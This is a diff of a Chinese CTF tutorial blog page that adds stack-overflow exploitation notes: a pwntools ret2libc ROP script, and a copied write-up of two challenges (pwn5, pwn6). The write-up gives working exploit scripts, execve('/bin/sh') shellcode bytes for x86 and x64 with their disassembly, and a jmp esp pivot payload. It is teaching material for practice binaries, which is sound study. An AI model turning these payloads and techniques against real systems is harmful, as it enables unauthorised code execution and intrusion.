@@ -120,7 +120,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    39 字
+                    2k 字
                   </span>&nbsp;
                 
 
@@ -128,7 +128,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      1 分钟
+                      8 分钟
                   </span>&nbsp;
                 
 
@@ -166,7 +166,175 @@
 <p>x 查看引用</p>
 <h2 id="bash部分"><a href="#bash部分" class="headerlink" title="bash部分"></a>bash部分</h2><pre><code class="bash">cyclic 200 #生成循环 200个
 cyclic -l xxxxx #计算偏移</code></pre>
-<h2 id="PWNTOOLS部分"><a href="#PWNTOOLS部分" class="headerlink" title="PWNTOOLS部分"></a>PWNTOOLS部分</h2><pre><code>u64 </code></pre><h2 id="pwndbg部分"><a href="#pwndbg部分" class="headerlink" title="pwndbg部分"></a>pwndbg部分</h2>
+<h2 id="PWNTOOLS部分"><a href="#PWNTOOLS部分" class="headerlink" title="PWNTOOLS部分"></a>PWNTOOLS部分</h2><pre><code>u64 
+asm 
+disasm </code></pre><pre><code class="python">from pwn import *
+sh = process(&#39;./ret2libc2&#39;)
+elf = ELF(&#39;./ret2libc2&#39;)
+rop = ROP(elf)
+
+payload = &#39;a&#39; * offset
+payload += p32(elf.plt[&#39;gets&#39;])
+payload += p32(rop.search(8).address)
+payload += p32(elf.bss() + 0x100)
+payload += p32(elf.plt[&#39;system&#39;])
+payload += p32(0)
+payload += p32(elf.bss() + 0x100)
+sh.sendline(payload)
+
+sh.sendline(&#39;/bin/sh\x00&#39;)
+sh.interactive()</code></pre>
+<p>先执行了pop_ret 然后执行gets，并放到了bss()+ 0x100的地方。随后system(elf.bss()+ 0x100)</p>
+<h2 id="pwndbg部分"><a href="#pwndbg部分" class="headerlink" title="pwndbg部分"></a>pwndbg部分</h2><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>jmp esp</p>
+<p>函数返回的时候esp会刚好指向返回地址的下一个地址</p>
+<p><img src="/2019/12/07/pwn_by_examples/image-20200125172524547.png" srcset="undefined" alt="image-20200125172524547"></p>
+<hr>
+<blockquote>
+<p>作者：看雪学院<br>链接：<a href="https://www.jianshu.com/p/1bdac9837eff" target="_blank" rel="noopener">https://www.jianshu.com/p/1bdac9837eff</a><br>来源：简书</p>
+</blockquote>
+<h2 id="第一题（堆栈直接执行shellcode）"><a href="#第一题（堆栈直接执行shellcode）" class="headerlink" title="第一题（堆栈直接执行shellcode）"></a>第一题（堆栈直接执行shellcode）</h2><p>接下来这题，我们再轻松一点，可以直接在堆栈中执行程序。</p>
+<p>pwn5（参考“阅读原文”）</p>
+<p>继续前面的套路。</p>
+<p><strong>第一步，查看保护</strong></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-41da81266dc47fff?imageMogr2/auto-orient/strip%7CimageView2/2/w/644/format/webp" srcset="undefined" alt="img"></p>
+<p>发现，可以直接在堆栈上执行程序了，开启的是PIE，地址随机化的保护。</p>
+<p><strong>第二步，判断漏洞函数。</strong></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-8b1062016fc33b8b?imageMogr2/auto-orient/strip%7CimageView2/2/w/480/format/webp" srcset="undefined" alt="img"></p>
+<p>发现函数是read，仅仅读取0x40（64）个字节。</p>
+<p><strong>第三步，计算目标变量的在堆栈中距离ebp的偏移</strong></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-14fee87811eb443d?imageMogr2/auto-orient/strip%7CimageView2/2/w/388/format/webp" srcset="undefined" alt="img"></p>
+<p>EBP的内容为：0x3761413661413561</p>
+<blockquote>
+<p>$ python patternLocOffset.py -l 700 -s 0x3761413661413561</p>
+<p>[*] Create pattern string contains 700 characters ok!</p>
+<p>[*] No exact matches, looking for likely candidates…</p>
+<p>[+] Possible match at offset 16 (adjusted another-endian)</p>
+<p>[+] take time: 0.0005 s</p>
+</blockquote>
+<p>距离EBP的偏移是16个字节，距离存放的返回地址是16+8=24个字节。</p>
+<p>这里可以发现IDA分析的又是正确的了，0x10个字节。</p>
+<p><strong>第四步和第五步，分析是否已经载入了可以利用的函数</strong></p>
+<p>如system，execve等</p>
+<p>发现，并没有上述函数。但是由于堆栈可以执行，因此我们可以考虑直接将shellcode阻止在payload里面。因此，这里和第五步分析是否有字符串/bin/sh合并了，我们可以自己放置字符串，并且调用对应的地址了。</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-15f527ac95286278?imageMogr2/auto-orient/strip%7CimageView2/2/w/448/format/webp" srcset="undefined" alt="img"></p>
+<p>理论上，我们可以直接利用pwntools产生的shellcode来进行部署，但是这道题有点特殊。在返回地址之后所剩余的空间=64-24-8=32个字节（返回地址还要占用8个字节），因此实际部署shellcode的长度还剩下32个字节，使用pwntools产生的shellcode有44个字节，太长了。因此，我们可以从网上找到更短的shellcode：</p>
+<blockquote>
+<p># 23 bytes</p>
+<p># <a href="https://www.exploit-db.com/exploits/36858/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36858/</a></p>
+<p>shellcode_x64 = “\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</p>
+</blockquote>
+<p>它的汇编形式是：</p>
+<blockquote>
+<p># char *const argv[]</p>
+<p>xorl %esi, %esi</p>
+<p>#</p>
+<p> ‘h’ ‘s’ ‘/‘ ‘/‘ ‘n’ ‘i’ ‘b’ ‘/‘</p>
+<p>movq $0x68732f2f6e69622f, %rbx</p>
+<p>#</p>
+<p> for ‘\x00’</p>
+<p>pushq %rsi</p>
+<p>pushq %rbx</p>
+<p>pushq %rsp</p>
+<p>#</p>
+<p> const char *filename</p>
+<p>popq %rdi</p>
+<p>#</p>
+<p> __NR_execve 59</p>
+<p>pushq $59</p>
+<p>popq %rax</p>
+<p>#</p>
+<p> char *const envp[]</p>
+<p>xorl %edx, %edx</p>
+<p>syscall</p>
+</blockquote>
+<p>好了，shellcode确定好了，我们现在还有一个问题。Shellcode执行的地址如何确定呢？shellcode的地址，其实就是buf的地址加上32个字节的偏移。</p>
+<p>我们前面发现，该程序是动态改变地址的，因此静态的确认buf地址是不可行的，进而静态的确认shellcode的地址是不可行的。</p>
+<p>处理到这里好像有点死胡同了，我们发现程序中有printf函数，理论上可以利用它来打印buf的地址，然后实时的计算buf+32的地址，就能够得到shellcode的地址。但是，我们回头看看程序本身的执行，会发现：</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-e928c61d7e0eba62?imageMogr2/auto-orient/strip%7CimageView2/2/w/729/format/webp" srcset="undefined" alt="img"></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-6fa118c955729fc4?imageMogr2/auto-orient/strip%7CimageView2/2/w/506/format/webp" srcset="undefined" alt="img"></p>
+<p>它实际上已经为我们解决了这个问题，自己输出了buf的地址（= = CTF题目的难易程度真的是微妙之间呀）。</p>
+<p>那么，我们的exp思路就是： 实时读取buf的地址，计算buf+32得到shellcode的地址，放置在payload中。</p>
+<blockquote>
+<p>from pwn import *</p>
+<p>code = ELF(‘./pwn5’)</p>
+<p># 23 bytes</p>
+<p># <a href="https://www.exploit-db.com/exploits/36858/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36858/</a></p>
+<p>shellcode_x64 = “\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</p>
+<p>sh.recvuntil(‘[‘)</p>
+<p>buf_addr = sh.recvuntil(‘]’, drop=True)</p>
+<p>buf_addr = int(buf_addr, 16)</p>
+<p>payload = ‘b’ * 24 + p64(buf_addr + 32) + shellcode_x64</p>
+<p>sh.sendline(payload)</p>
+<p>sh.interactive()</p>
+</blockquote>
+<p>堆栈的布置图，以及地址的相对位置，以buf为起点。</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-bb20383a152f69a1?imageMogr2/auto-orient/strip%7CimageView2/2/w/699/format/webp" srcset="undefined" alt="img"></p>
+<p>第二题（控制esp进行精准打击）</p>
+<p>接下来，我们来点有难度的。在这个程序中，我们的payload实在放不下了，即使是23字节，那么怎么办呢？</p>
+<p>pwn6（参考“阅读原文”）</p>
+<p>继续前面的过程：</p>
+<p><strong>第一步：检测保护情况</strong></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-803630bd28a73fb7?imageMogr2/auto-orient/strip%7CimageView2/2/w/520/format/webp" srcset="undefined" alt="img"></p>
+<p>发现，是个三无程序。么有任何保护，看起来很简单？哈哈，并没有。看官请继续。</p>
+<p><strong>第二步，判断漏洞函数</strong></p>
+<p>如gets,scanf等：</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-4208fca26260a9d6?imageMogr2/auto-orient/strip%7CimageView2/2/w/313/format/webp" srcset="undefined" alt="img"></p>
+<p>发现是fgets函数，仅仅读取50个字节的字符长度。</p>
+<p><strong>第三步</strong></p>
+<p>计算目标变量的在堆栈中距离ebp的偏移。</p>
+<p>方法和前面类似，发现偏移距离ebp是0x20，那么距离ret_addr就是0x20+4=0x24（36）字节了。</p>
+<p><strong>第四步和第五步</strong></p>
+<p>分析是否已经载入了可以利用的函数。发现并没有：</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-ec80829673fdb148?imageMogr2/auto-orient/strip%7CimageView2/2/w/461/format/webp" srcset="undefined" alt="img"></p>
+<blockquote>
+<p>$ ROPgadget –binary stack_pivoting_1 –string ‘/bin/sh’</p>
+<p>Strings information</p>
+<p>============================================================</p>
+</blockquote>
+<p>字符串自然也是没有的。</p>
+<p>我们考虑利用shellcode，好像可以类似于上一题的操作了。但是并不能，留给我们布置shellcode的长度为50-36-4=10字节（同样有4个字节的返回地址存放）！尴尬不==，放两个地址就没有位置了。但如果你能够厉害到用10个字节做shellcode，请大胆分享出来！</p>
+<p>那么怎么办呢？</p>
+<p>既然，堆栈溢出的位置不行了，那么我们就把shellcode放在栈里面吧！因为堆栈具有可执行的权限，因此这样完全是可行的。</p>
+<p>这里，我先放图出来解释一下思路：</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4238783-605a219a5314b46c?imageMogr2/auto-orient/strip%7CimageView2/2/w/679/format/webp" srcset="undefined" alt="img"></p>
+<p>我们这样就总共有0x20（36个字节）的位置存放shellcode的了，顿时感觉找到了新出路。但是，要做到跳转到放置shellcode的位置，似乎并没有那么简单。要达到这个目的，我们需要做到以下几件事情：</p>
+<p>推算shellcode放置的地址</p>
+<p>跳转到shellcode放置的位置</p>
+<p>首先，第一点，shellcode的位置就是发射payload的时候esp_old的位置，我们可以推算出来，当程序提取完返回地址之后，esp指向的地址距离esp_old的地址为0x20+4(ebp)+4(ret_addr)=0x28。因此，我们需要用当前的esp-0x28，得到的就是shellcode的地址。</p>
+<p>对于第二点，我们如何让eip顺利的依次取出我们设计好的路线图呢？在ret_addr，我们需要寻找到一个gadget，它能够跳转到esp的位置，以继续往后执行栈上的代码。注意，这里我们为什么不直接将可执行的代码布置在ret_addr的位置，因为这里是原本的函数提取返回函数地址的地方，它并不会执行这里位置的代码，而是执行这个位置的内容指向的地址的代码。我们需要jmp esp这个操作，来让程序流获得在栈上执行的先河。</p>
+<blockquote>
+<p>$ ROPgadget –binary stack_pivoting_1 –only ‘jmp|ret’ | grep ‘esp’</p>
+<p>0x08048504 : jmp esp</p>
+</blockquote>
+<p>发现只有这么一个地址。0x08048504。这也正是图中的位置。注意，当我们取出ret_addr里面的地址的时候，esp已经+4了，因此就会指向我们的下一步操作：跳转回esp_old的位置。</p>
+<p>在这里，我们直接可以选择让pwntools产生可执行的代码”sub  esp 0x28; jmp esp”。注意，这里可以是直接运行的代码，因为我们的程序已经开始在栈上执行了，而不再是取出地址了。</p>
+<p>最后的EXP按照下面这样布置：</p>
+<blockquote>
+<p>from pwn import *</p>
+<p>sh = process(‘./pwn6’)</p>
+<p>shellcode_x86 = “\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73”</p>
+<p>shellcode_x86 += “\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0”</p>
+<p>shellcode_x86 += “\x0b\xcd\x80”</p>
+<p>sub_esp_jmp = asm(‘sub esp, 0x28;jmp esp’)</p>
+<p>jmp_esp = 0x08048504</p>
+<p>payload = shellcode_x86 + (</p>
+<p>0x20 - len(shellcode_x86)) * ‘b’ + ‘bbbb’ + p32(jmp_esp) + sub_esp_jmp</p>
+<p>sh.sendline(payload)</p>
+<p>sh.interactive()</p>
+</blockquote>
+<p>注意，这里我们又启用了另外一段代码：</p>
+<p>它更加短，只有21个字节。Shellcode越短是越好的。它的汇编对应如下：</p>
+<blockquote>
+<p>shellcode_x86 = “\x31\xc9”          # xor   ecx, ecx</p>
+<p>shellcode_x86 += “\xf7\xe1”       # mul   ecx</p>
+<p>shellcode_x86 += “\x51”       # push  ecx</p>
+<p>shellcode_x86 += “\x68\x2f\x2f\x73\x68” # push 0x68732f2f</p>
+<p>shellcode_x86 += “\x68\x2f\x62\x69\x6e” # push 0x6e69622f </p>
+<p>shellcode_x86 += “\x89\xe3”       # mov   ebx, esp</p>
+<p>shellcode_x86 += “\xb0\x0b”       # moval, 0xb</p>
+<p>shellcode_x86 += “\xcd\x80” # int 0x80</p>
+</blockquote>
+<h1 id><a href="#" class="headerlink" title></a></h1>
             <hr>
           </div>
           <br>
@@ -177,6 +345,9 @@ cyclic -l xxxxx #计算偏移</code></pre>
                 <i class="iconfont icon-inbox"></i>
                 
                   <a class="hover-with-bg" href="/categories/CTF">CTF</a>
+                  &nbsp;
+                
+                  <a class="hover-with-bg" href="/categories/%E5%A4%87%E5%BF%98">备忘</a>
                   &nbsp;
                 
                   <a class="hover-with-bg" href="/categories/%E6%95%99%E7%A8%8B">教程</a>
